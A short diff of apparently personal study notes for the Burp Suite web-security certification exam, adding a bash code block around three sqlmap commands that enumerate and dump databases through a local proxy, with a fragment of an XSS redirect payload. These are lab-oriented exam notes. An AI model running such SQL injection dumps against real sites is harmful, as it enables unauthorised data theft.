@@ -6,8 +6,6 @@
 - [pawlokk/burp-exam-notes/blob/main/methodology.txt](https://github.com/pawlokk/burp-exam-notes/blob/main/methodology.txt)
 - [bscpcheatsheet.gitbook.io/exam](https://bscpcheatsheet.gitbook.io/exam)
 - [Notes template](https://www.y-security.de/news-en/looking-at-the-portswigger-burp-suite-certification/index.html)
-# More extensions
-Quick detection - Scan Manual insertion point https://portswigger.net/bappstore/ca7ee4e746b54514a0ca5059329e926f
 # Payload processing
 - [Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
 # XSS
@@ -20,10 +18,11 @@ location ='https://url.web-security-academy.net/?SearchTerm=%22-%28window%5B%22d
 ```
 
 # SQLi
+```bash
 sqlmap -u "url" --cookie="cookies" --batch --dbs --random-agent -p "parameter"
 sqlmap -u "url" --cookie="cookies" --batch --dbs --random-agent -p "parameter" --proxy="http://127.0.0.1:8080/" --level=3
 sqlmap -u "url" --cookie="cookies" --batch -D database -T table --random-agent -p "parameter" --proxy="http://127.0.0.1:8080/" --level=3 --dump
-
+```
 
 # Insecure Deserialization
 - Command
